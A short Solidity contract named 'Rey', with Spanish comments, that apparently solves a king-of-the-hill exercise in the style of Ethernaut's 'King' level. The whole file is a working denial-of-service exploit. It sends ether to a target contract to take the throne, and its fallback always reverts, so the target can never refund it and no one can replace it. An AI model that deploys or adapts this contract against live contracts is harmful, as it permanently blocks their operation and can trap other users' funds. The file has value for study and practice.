// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Rey {
    function HaceRey(address addr) public payable{
      (bool result,bytes memory data)=addr.call{value:msg.value}("");
      if(!result) revert("El rey revierte");
    }

//Si recibe dinero hace fallback entonces nadie le puede transferir de vuelta  
  fallback() external payable{
    revert("Soy el rey");
  }
}

